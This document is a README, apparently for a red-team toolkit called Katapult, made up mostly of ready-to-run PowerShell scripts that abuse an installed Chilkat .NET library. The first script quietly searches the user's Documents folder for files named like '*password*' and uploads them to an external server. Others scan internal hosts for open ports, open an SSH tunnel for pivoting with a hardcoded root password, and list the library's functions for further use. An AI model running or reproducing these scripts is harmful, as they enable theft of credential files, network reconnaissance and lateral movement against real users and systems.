# Katapult

Example of exploiting the Chilkat .NET assembly for Red Team exercises using Powershell.

This example searches the user's MyDocuments folder and uploads file names matching *password* to an external web server.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $up = New-Object Chilkat.Upload
   $docs = [environment]::getfolderpath("mydocuments")
   $up.Hostname = "10.1.2.3"
   $up.Port = 8000
   $up.Path = "/upload"
   $up.Expect100Continue = $false
   $f = Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName
   if($f -ne $null) {
      $f | ForEach-Object { $up.AddFileReference("files", $_) }
      $null = $up.BlockingUpload()
      Write-Host "$($f.Count) files uploaded"
   } else {
      Write-Host "No matching files found"
   } 
}
```

This example performs a TCP port scan.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $sock = New-Object Chilkat.Socket
   $null = $sock.UnlockComponent("whatever")
   $targets = "10.2.2.2", "10.3.3.3"
   $ports = 21, 22, 23, 80, 443, 445, 389, 3389
   $mswait = 250
   foreach($t in $targets) {
      foreach ($p in $ports) {
         $c = $sock.Connect($t, $p, $false, $mswait)
         if($c -eq $true) {
            Write-Host "SUCCESS: $t port $p"
            $null = $sock.Close($mswait)
         } else {
            Write-Host "FAIL: $t port $p"
         }
      }
   }
}
```

This example creates an SSH TCP tunnel for pivoting.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $sshtun = New-Object Chilkat.SshTunnel
   $null = $sshtun.UnlockComponent("whatever")
   $sshhost = "192.168.1.242" # The host to SSH to
   $sshport = 22 # The port to SSH to
   $sshuser = "root" # The user name to login with 
   $sshpass = "P@55w0rd4r**t" # The password to login with
   $tunhost = "127.0.0.1" # The host you will access through the tunnel
   $tunport = 80 # The port you will access through the tunnel
   $locaddr = "0.0.0.0" # The IP address on this Windows host you will connect to
   $locport = 8080 # The port on this Windows host you will connect to
   $sshtun.ListenBindIpAddress = $locaddr
   $sshtun.DestHostname = $tunhost
   $sshtun.DestPort = $tunport
   $null = $sshtun.Connect($sshhost, $sshport)
   $null = $sshtun.AuthenticatePw($sshuser, $sshpass)
   if($sshtun.IsSshConnected() -eq $false) {
      Write-Host "SSH logon failed"
   } else {
      $null = $sshtun.BeginAccepting($locport)
      Write-Host "Connect to $locaddr port $locport to access tunneled service $tunhost port $tunport"
      Write-Host "Press any key to close the tunnel and exit"
      $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
      $null = $sshtun.CloseTunnel($true)
      exit
   }
}
```

To list other functions you may wish to use.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $asm = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $asm.GetTypes() | ?{$_.IsPublic} | select Name | sort Name
}
```
